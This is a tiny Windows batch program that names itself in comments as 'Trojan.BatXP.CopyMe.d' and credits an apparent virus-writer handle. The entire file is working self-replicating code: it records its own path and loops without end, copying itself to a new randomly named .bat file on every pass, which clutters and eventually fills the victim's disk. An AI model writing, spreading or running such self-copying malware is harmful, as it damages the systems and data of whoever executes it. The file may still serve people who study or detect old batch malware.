cls
ReM Trojan.BatXP.CopyMe.d
ReM by Second Part To Hell
set a=%0
:: because there would be a error: %0 would be ":copyme" ;)
:copyme
copy %a% %random%.bat
pause
call :copyme